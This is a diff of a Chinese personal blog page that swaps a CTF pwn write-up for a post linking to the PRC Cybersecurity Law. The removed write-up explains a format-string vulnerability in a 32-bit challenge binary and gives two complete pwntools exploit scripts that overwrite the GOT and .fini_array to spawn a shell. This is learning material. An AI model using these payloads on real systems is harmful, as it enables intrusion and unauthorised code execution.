@@ -6,18 +6,18 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>PWN2_me | ESE</title>
+  <title>中华人民共和国网络安全法 | ESE</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN PWN从开始到开始–FmtStr">
+  <meta name="description" content="记录每天的进步，只有努力不会背叛自己！ 中华人民共和国网络安全法">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PWN2_me">
-<meta property="og:url" content="http://yoursite.com/2017/10/09/pwn3_me/index.html">
+<meta property="og:title" content="中华人民共和国网络安全法">
+<meta property="og:url" content="http://yoursite.com/2017/11/07/misc_fa/index.html">
 <meta property="og:site_name" content="ESE">
-<meta property="og:description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN PWN从开始到开始–FmtStr">
-<meta property="og:updated_time" content="2017-10-10T06:55:50.813Z">
+<meta property="og:description" content="记录每天的进步，只有努力不会背叛自己！ 中华人民共和国网络安全法">
+<meta property="og:updated_time" content="2017-11-08T02:53:58.553Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PWN2_me">
-<meta name="twitter:description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN PWN从开始到开始–FmtStr">
+<meta name="twitter:title" content="中华人民共和国网络安全法">
+<meta name="twitter:description" content="记录每天的进步，只有努力不会背叛自己！ 中华人民共和国网络安全法">
   
   
     <link rel="icon" href="/favicon.png">
@@ -159,43 +159,29 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-pwn3_me" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-misc_fa" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      PWN2_me
+      中华人民共和国网络安全法
     </h1>
   
 
         
-        <a href="/2017/10/09/pwn3_me/" class="archive-article-date">
-  	<time datetime="2017-10-09T07:44:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-10-09</time>
+        <a href="/2017/11/07/misc_fa/" class="archive-article-date">
+  	<time datetime="2017-11-07T07:58:07.243Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-07</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>记录每天的进步，只有努力不会背叛自己！每天学习一点PWN</p>
-<h1 id="PWN从开始到开始–FmtStr"><a href="#PWN从开始到开始–FmtStr" class="headerlink" title="PWN从开始到开始–FmtStr"></a>PWN从开始到开始–FmtStr</h1><a id="more"></a>
-<h2 id="1、程序"><a href="#1、程序" class="headerlink" title="1、程序"></a>1、程序</h2><p>链接：<a href="http://pan.baidu.com/s/1mil6uTE" target="_blank" rel="external">http://pan.baidu.com/s/1mil6uTE</a> 密码：7ff0<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[*] <span class="string">'/root/ctf/pwn_learning/zjgsu/pwn3/pwn3'</span></div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x8048000)</div></pre></td></tr></table></figure></p>
-<p>有canary保护，感觉现在还不会</p>
-<h2 id="2、分析程序"><a href="#2、分析程序" class="headerlink" title="2、分析程序"></a>2、分析程序</h2><p>我们去尝试运行，摸清了基本上的程序的功能。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@kali:pwn3<span class="comment"># ./pwn3 </span></div><div class="line">Hello, I<span class="string">'m nao!</span></div><div class="line"><span class="string">Please tell me your name... asd</span></div><div class="line"><span class="string">Nice to meet you, asd :)</span></div><div class="line"><span class="string">root@kali:pwn3#</span></div></pre></td></tr></table></figure></p>
-<p>用ida打开看看，发现有system函数，很开心.发现main函数有格式化漏洞<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">printf</span>(<span class="string">"Please tell me your name... "</span>);</div><div class="line"><span class="keyword">if</span> ( getnline((char *)&amp;v6, 64) )</div><div class="line">&#123;</div><div class="line">  sprintf((char *)&amp;v5, <span class="string">"Nice to meet you, %s :)\n"</span>, &amp;v6);</div><div class="line">  result = <span class="built_in">printf</span>((const char *)&amp;v5);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>printf(&amp;v5)这里是格式化漏洞，继续看发现getnline函数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">size_t __cdecl getnline(char *s, int n)</div><div class="line">&#123;</div><div class="line">  char *v3; // [sp+1Ch] [bp-Ch]@1</div><div class="line"></div><div class="line">  fgets(s, n, stdin);</div><div class="line">  v3 = strchr(s, 10);</div><div class="line">  <span class="keyword">if</span> ( v3 )</div><div class="line">    *v3 = 0;</div><div class="line">  <span class="built_in">return</span> strlen(s);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>strlen(s)这里是计算输入进来字符的长度，只有一个参数，这里是不是很熟悉啊，没错。我们的system函数 也只有一个参数system(s),那么我们可以把将system的plt覆盖到strlen的got，再将参数’/bin/sh’传入，这里我们需要做两件事情<br>1、将strlen_got=system_plt<br>2、回到mian函数，将’/bin/sh’输入，这时就能到达system(‘/bin/sh’)</p>
-<h2 id="3、写exp"><a href="#3、写exp" class="headerlink" title="3、写exp"></a>3、写exp</h2><p>这里的问题是，格式化执行一次后程序就会退出了，这里了解一下elf程序运行机制，当程序执行main函数前会执行一些准备开始的程序，比如：。初始化节 .init_array 和 .init<br>结束时也会运行一些结束的程序，比如:动态库还可提供终止节。终止节 .fini_array<br>这就意味着我们可以利用终止节回到mian再次执行。</p>
-<p>查看终止节<br><code>objdump -s  pwn3 |grep fini</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@kali:pwn3<span class="comment"># objdump -s  pwn3 |grep fini</span></div><div class="line">Contents of section .fini:</div><div class="line">Contents of section .fini_array:</div></pre></td></tr></table></figure></p>
-<p>发现存在终止节<br>接着利用pwn3直接得到<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">systemPlt = elf.plt[<span class="string">'system'</span>]</div><div class="line">strlenGot = elf.got[<span class="string">'strlen'</span>]</div><div class="line">mainSymbol = elf.symbols[<span class="string">'main'</span>]</div><div class="line">finiSymbol = elf.symbols[<span class="string">'__do_global_dtors_aux_fini_array_entry'</span>]</div></pre></td></tr></table></figure></p>
-<h2 id="4，exp"><a href="#4，exp" class="headerlink" title="4，exp:"></a>4，exp:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./pwn3'</span>)</div><div class="line">systemPlt = elf.plt[<span class="string">'system'</span>]</div><div class="line">strlenGot = elf.got[<span class="string">'strlen'</span>]</div><div class="line">mainSymbol = elf.symbols[<span class="string">'main'</span>]</div><div class="line">finiSymbol = elf.symbols[<span class="string">'__do_global_dtors_aux_fini_array_entry'</span>]</div><div class="line"></div><div class="line">p = process(<span class="string">'./pwn3'</span>)</div><div class="line"><span class="comment">#p = remote('127.0.0.1',4004)</span></div><div class="line">offset =12</div><div class="line"></div><div class="line">writes = &#123;finiSymbol:mainSymbol,strlenGot:systemPlt&#125;</div><div class="line">padding = <span class="string">'aa'</span></div><div class="line">payload1 = padding + fmtstr_payload(offset = offset,writes = writes,numbwritten = 20,write_size=<span class="string">'int'</span>)</div><div class="line"><span class="built_in">print</span> <span class="string">"payload:len = %d   :%s"</span>%(len(payload1),payload1)</div><div class="line">p.recv()</div><div class="line"><span class="comment">#gdb.attach(p)</span></div><div class="line">p.sendline(payload1)</div><div class="line">sleep(2)</div><div class="line">p.recvline()</div><div class="line">payload2 = <span class="string">'/bin/sh'</span></div><div class="line">p.sendline(payload2)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
-<p>offset=12为什么是12，这是我手动的，当然pwntools提供了找偏移的个数的函数Fmtstr，<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">root@kali:pwn3<span class="comment"># ./pwn3 </span></div><div class="line">Hello, I<span class="string">'m nao!</span></div><div class="line"><span class="string">Please tell me your name... AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p</span></div><div class="line"><span class="string">Nice to meet you, AAAA0x80487d00xff8e5e2c(nil)(nil)(nil)(nil)0x6563694e0x206f74200x7465656d0x756f79200x4141202c0x702541410x70257025 :)</span></div><div class="line"><span class="string">root@kali:pwn3# ./pwn3 </span></div><div class="line"><span class="string">Hello, I'</span>m nao!</div><div class="line">Please tell me your name... AABBBB%p%p%p%p%p%p%p%p%p%p%p%p%p</div><div class="line">Nice to meet you, AABBBB0x80487d00xfff70c5c(nil)(nil)(nil)(nil)0x6563694e0x206f74200x7465656d0x756f79200x4141202c0x424242420x70257025 :)</div><div class="line">root@kali:pwn3<span class="comment"># ./pwn3 </span></div><div class="line">Hello, I<span class="string">'m nao!</span></div><div class="line"><span class="string">Please tell me your name... AABBBB%12$p</span></div><div class="line"><span class="string">Nice to meet you, AABBBB0x42424242 :)</span></div><div class="line"><span class="string">root@kali:pwn3#</span></div></pre></td></tr></table></figure></p>
-<p>FmtStr和fmtstr_payload函数参考:<br><a href="https://esebanana.github.io/2017/10/09/pwn6/#more" target="_blank" rel="external">https://esebanana.github.io/2017/10/09/pwn6/#more</a></p>
-<h2 id="5，修改exp"><a href="#5，修改exp" class="headerlink" title="5，修改exp:"></a>5，修改exp:</h2><p>上面的那个exp本地运行成功，但如果连上网的话，由于fmtstr_payload函数是产生大量的数据写入，如要写入的地址时0x8040506,那么就会生成0x8040506的无用字符传过去，在本地也需要运行一会儿，在上网根本不行，这里得用字节写入，这里可以参考:<br><a href="https://esebanana.github.io/2017/09/19/pwn3/#more" target="_blank" rel="external">https://esebanana.github.io/2017/09/19/pwn3/#more</a><br>中的修改b,贴上修改后的exp<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./pwn3'</span>)</div><div class="line">systemPlt = elf.plt[<span class="string">'system'</span>]</div><div class="line">strlenGot = elf.got[<span class="string">'strlen'</span>]</div><div class="line">mainSymbol = elf.symbols[<span class="string">'main'</span>]</div><div class="line">finiSymbol = elf.symbols[<span class="string">'__do_global_dtors_aux_fini_array_entry'</span>]</div><div class="line">log.info(<span class="string">"system:%x\nstrlen:%x\nmain:%x\nfini:%x\n"</span>%(systemPlt,strlenGot,mainSymbol,finiSymbol))</div><div class="line"></div><div class="line">p = process(<span class="string">'./pwn3'</span>)</div><div class="line">offset =12</div><div class="line"></div><div class="line">mainSymbol = 0x080485ed</div><div class="line">finiSymbol = 0x08049934</div><div class="line">systemPlt = 0x08048490</div><div class="line">strlenGot = 0x8049a54</div><div class="line"></div><div class="line">payload = <span class="string">'aa'</span>+p32(0x08049936)+p32(0x08049a56)+p32(0x08049a54)+p32(0x08049934)</div><div class="line"></div><div class="line">first = 0x804 - 0x1c - 0x8 <span class="comment">#print 0x804 bytes before 0x8049936 </span></div><div class="line">second = 0x8490 - 0x0804</div><div class="line">third = 0x85ed - 0x8490</div><div class="line">payload += <span class="string">'%'</span> + str(first) +  <span class="string">'x%12$hn'</span></div><div class="line">payload += <span class="string">'%13$hn'</span></div><div class="line">payload += <span class="string">'%'</span> + str(second) + <span class="string">'x%14$hn'</span></div><div class="line">payload += <span class="string">'%'</span> + str(third) + <span class="string">'x%15$hn'</span></div><div class="line">payload += <span class="string">""</span></div><div class="line"></div><div class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">'... '</span>)</div><div class="line">p.sendline(payload)</div><div class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">'... '</span>)</div><div class="line">payload2 = <span class="string">'/bin/sh'</span></div><div class="line">p.sendline(payload2)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
-<p>这个exp是两字节写入</p>
-<h3 id="文学修养"><a href="#文学修养" class="headerlink" title="文学修养"></a>文学修养</h3><p>我本楚狂人,凤歌笑孔丘<br>奈何许!天下人何限?慊慊只为汝!</p>
+        <p>记录每天的进步，只有努力不会背叛自己！</p>
+<h1 id="中华人民共和国网络安全法"><a href="#中华人民共和国网络安全法" class="headerlink" title="中华人民共和国网络安全法"></a>中华人民共和国网络安全法</h1><a id="more"></a>
+<h2 id="1、链接"><a href="#1、链接" class="headerlink" title="1、链接"></a>1、链接</h2><p><a href="https://www.virzz.com/2017/06/01/Network_security_law_of_the_PRC.html" target="_blank" rel="external">https://www.virzz.com/2017/06/01/Network_security_law_of_the_PRC.html</a></p>
 
       
 
@@ -280,7 +266,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/10/09/pwn3_me/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/11/07/misc_fa/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -294,18 +280,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2017/10/10/re_tls/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          RE_tls
-        
-      </div>
-    </a>
   
-  
-    <a href="/2017/10/09/pwn6/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">PWN_x86—6_FmtStr</div>
+    <a href="/2017/11/05/re_suanfa/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">RE</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -333,7 +310,7 @@
   
   <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="pwn3_me" data-title="PWN2_me" data-url="http://yoursite.com/2017/10/09/pwn3_me/"></div>
+	<div class="ds-thread" data-thread-key="misc_fa" data-title="中华人民共和国网络安全法" data-url="http://yoursite.com/2017/11/07/misc_fa/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
@@ -356,8 +333,8 @@
   <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
 <script>
   var cloudTieConfig = {
-    url: "http://yoursite.com/2017/10/09/pwn3_me/", 
-    sourceId: "pwn3_me",
+    url: "http://yoursite.com/2017/11/07/misc_fa/", 
+    sourceId: "misc_fa",
     productKey: "true",
     target: "cloud-tie-wrapper"
   };
@@ -366,7 +343,7 @@
   
 
   
-  <div id="SOHUCS" sid="pwn3_me" ></div> 
+  <div id="SOHUCS" sid="misc_fa" ></div> 
 <script type="text/javascript"> 
 window.YiliaChangyanWrap = function() {
     var appid = "true"; 
